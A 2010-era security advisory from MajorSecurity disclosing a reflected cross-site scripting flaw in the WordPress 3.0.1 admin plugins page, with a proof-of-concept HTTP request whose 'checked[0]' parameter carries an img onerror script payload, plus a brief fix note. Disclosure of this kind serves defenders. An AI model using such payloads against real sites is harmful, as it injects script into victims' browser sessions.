[MajorSecurity SA-080]WordPress 3.0.1 - Cross Site Scripting Issue

Details
=============
Product: WordPress 3.0.1
Security-Risk: low
Remote-Exploit: yes
Vendor-URL: http://www.wordpress.org/
Advisory-Status: published

Credits
=============
Discovered by: David Vieira-Kurz of MajorSecurity

Original Advisory
=============
http://www.majorsecurity.net/wordpress-3-xss.php

Affected Products:
=============
WordPress 3.0.1
Prior versions may also be vulnerable

Description
=============
"WordPress is web software you can use to create a beautiful website or
blog." - from wordpress.org

More Details
=============
I have discovered some vulnerabilities in WordPress 3.0.1, which can be
exploited by malicious people to conduct reflected cross-site scripting
attacks. Input passed directly to the "checked[0]" parameter in
"wp-admin/plugins.php" when the "action" parameter is set to
"delete-selected" is not properly sanitised before being stored and
returned to the user. This can be exploited to execute arbitrary HTML
and script code in a user's browser session in context of an affected site.

Proof of Concept
=============
GET
/wordpress/wp-admin/plugins.php?action=delete-selected&checked%5B0%5D=x<img%20src%3da%20onerror%3dalert(1)>yz&plugin_status=all&paged=1&_wpnonce=b58a891de5
HTTP/1.1
Host: 127.0.0.1
Accept: */*
Accept-Language: en
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)
Connection: close
Cookie:
wordpress_logged_in_5bd7a9c61cda6e66fc921a05bc80ee93=admin%7C1281711223%7Ce88c76a1b42c7d91f501623fa434b541;
wordpress_test_cookie=WP+Cookie+check;
wordpress_5bd7a9c61cda6e66fc921a05bc80ee93=admin%7C1281711223%7C187ec57f486086f5a3cca1ea9a6e7394;
wp-settings-time-1=1281538642; wp-settings-1=deleted;

Solution
=============
Web applications should never trust on user generated input and
therefore sanatize all input. Edit the source code to ensure that input
is properly sanitised.

MajorSecurity
================
MajorSecurity is a German sourcecode audit and penetration testing
company which focuses on (web-)application security. We offer
professional source code audit, penetrationstest and pci dss compliance
tests. Visit us at http://www.majorsecurity.net/source-code-audit.php

Use of terms
================
Unaltered electronic reproduction of this advisory is permitted. For all
other reproduction or publication, in printing or otherwise, contact us
for permission. Use of the advisory constitutes acceptance for use in an
"as is" condition. All warranties are excluded. In no event shall
MajorSecurity be liable for any damages whatsoever including direct,
indirect, incidental, consequential, loss of business profits or special
damages, even if MajorSecurity has been advised of the possibility of
such damages.


